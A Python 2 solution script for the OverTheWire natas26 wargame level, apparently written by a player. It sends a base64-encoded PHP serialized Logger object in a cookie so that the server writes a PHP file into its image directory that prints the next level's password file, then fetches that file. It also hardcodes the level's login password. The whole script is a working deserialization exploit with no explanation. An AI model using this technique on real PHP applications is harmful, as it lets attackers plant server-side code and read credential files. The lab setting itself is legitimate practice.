import requests

url = "http://natas26.natas.labs.overthewire.org"

user = "natas26"
pwd = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"

s = requests.session()

sid = "h4ck3d"
php_encoded_obj = "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MjoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyN19wd2QucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MjE6InlvdSBhcmUgYmVpbmcgaDRjazNkCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYzOiI8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PgoiO30"
cookies = {"PHPSESSID": sid, "drawing": php_encoded_obj}

r = s.get(url, auth=(user,pwd), cookies=cookies)

# /var/www/natas/natas26/img/natas27_pwd.php
r = s.get(url + "/img/natas27_pwd.php", auth=(user,pwd), cookies=cookies)
print r.content